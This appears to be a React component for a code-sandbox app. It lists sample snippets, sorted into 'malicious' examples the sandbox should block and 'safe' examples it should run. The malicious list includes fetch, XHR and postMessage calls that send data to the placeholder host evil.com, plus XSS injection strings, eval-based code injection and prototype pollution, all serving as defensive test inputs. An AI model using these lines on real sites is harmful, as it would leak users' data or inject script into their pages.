import { useState } from 'react';
import './SecurityTestPanel.css';

const MALICIOUS_EXAMPLES = [
  {
    name: 'Eval Attack',
    code: `eval('console.log("Malicious code executed!")');`,
    description: 'Direct eval() - should be blocked'
  },
  {
    name: 'Function Constructor',
    code: `const fn = new Function('console.log("Code injection")');\nfn();`,
    description: 'Function constructor - should be blocked'
  },
  {
    name: 'Window Access',
    code: `window.location = 'http://evil.com/steal';\nconsole.log('Redirected');`,
    description: 'Window manipulation - should be blocked'
  },
  {
    name: 'Document Access',
    code: `document.body.innerHTML = '<script>alert("XSS")</script>';`,
    description: 'DOM manipulation - should be blocked'
  },
  {
    name: 'Fetch Attack',
    code: `fetch('http://evil.com/steal?data=' + 'sensitive info');`,
    description: 'Network request - should be blocked'
  },
  {
    name: 'LocalStorage Theft',
    code: `localStorage.setItem('stolen', 'sensitive data');\nconsole.log(localStorage.getItem('stolen'));`,
    description: 'Storage access - should be blocked'
  },
  {
    name: 'Prototype Pollution',
    code: `const obj = {};\nobj.__proto__.isAdmin = true;\nconsole.log('Prototype polluted');`,
    description: 'Prototype manipulation - should be blocked'
  },
  {
    name: 'InnerHTML XSS',
    code: `const div = { innerHTML: '' };\ndiv.innerHTML = '<img src=x onerror=alert("XSS")>';`,
    description: 'XSS via innerHTML - should be blocked'
  },
  {
    name: 'XMLHttpRequest',
    code: `const xhr = new XMLHttpRequest();\nxhr.open('POST', 'http://evil.com');\nxhr.send('data');`,
    description: 'XHR request - should be blocked'
  },
  {
    name: 'Infinite Loop',
    code: `while(true) {\n  console.log('Infinite loop');\n}`,
    description: 'Should timeout after 5 seconds'
  },
  {
    name: 'Base64 Obfuscation',
    code: `const encoded = btoa('malicious');\nconst decoded = atob(encoded);\nconsole.log(decoded);`,
    description: 'Obfuscation attempt - should be blocked'
  },
  {
    name: 'PostMessage Exfiltration',
    code: `postMessage('stolen data', 'http://evil.com');`,
    description: 'Data exfiltration - should be blocked'
  }
];

const SAFE_EXAMPLES = [
  {
    name: 'Simple Math',
    code: `console.log(2 + 2);\nconsole.log(Math.sqrt(16));`,
    description: 'Safe math operations - should work'
  },
  {
    name: 'String Operations',
    code: `const name = 'World';\nconsole.log('Hello, ' + name + '!');`,
    description: 'Safe string operations - should work'
  },
  {
    name: 'Array Operations',
    code: `const arr = [1, 2, 3];\nconsole.log(arr.map(x => x * 2));`,
    description: 'Safe array operations - should work'
  },
  {
    name: 'Object Operations',
    code: `const obj = { a: 1, b: 2 };\nconsole.log(Object.keys(obj));`,
    description: 'Safe object operations - should work'
  },
  {
    name: 'Date Operations',
    code: `const now = new Date();\nconsole.log(now.toISOString());`,
    description: 'Safe date operations - should work'
  },
  {
    name: 'JSON Operations',
    code: `const data = { name: 'test', value: 123 };\nconsole.log(JSON.stringify(data));`,
    description: 'Safe JSON operations - should work'
  }
];

function SecurityTestPanel({ onLoadCode }) {
  const [activeTab, setActiveTab] = useState('malicious');
  const [selectedExample, setSelectedExample] = useState(null);

  const examples = activeTab === 'malicious' ? MALICIOUS_EXAMPLES : SAFE_EXAMPLES;

  const handleLoadExample = (example) => {
    onLoadCode(example.code);
    setSelectedExample(example.name);
  };

  return (
    <div className="security-test-panel">
      <div className="test-panel-header">
        <h3>🧪 Security Test Examples</h3>
        <div className="test-tabs">
          <button
            className={activeTab === 'malicious' ? 'active' : ''}
            onClick={() => setActiveTab('malicious')}
          >
            ⚠️ Malicious (Should Block)
          </button>
          <button
            className={activeTab === 'safe' ? 'active' : ''}
            onClick={() => setActiveTab('safe')}
          >
            ✅ Safe (Should Work)
          </button>
        </div>
      </div>
      
      <div className="test-examples">
        {examples.map((example, index) => (
          <div
            key={index}
            className={`test-example ${selectedExample === example.name ? 'selected' : ''}`}
          >
            <div className="example-header">
              <h4>{example.name}</h4>
              <button
                className="load-button"
                onClick={() => handleLoadExample(example)}
              >
                Load
              </button>
            </div>
            <p className="example-description">{example.description}</p>
            <pre className="example-code">{example.code}</pre>
          </div>
        ))}
      </div>
    </div>
  );
}

export default SecurityTestPanel;

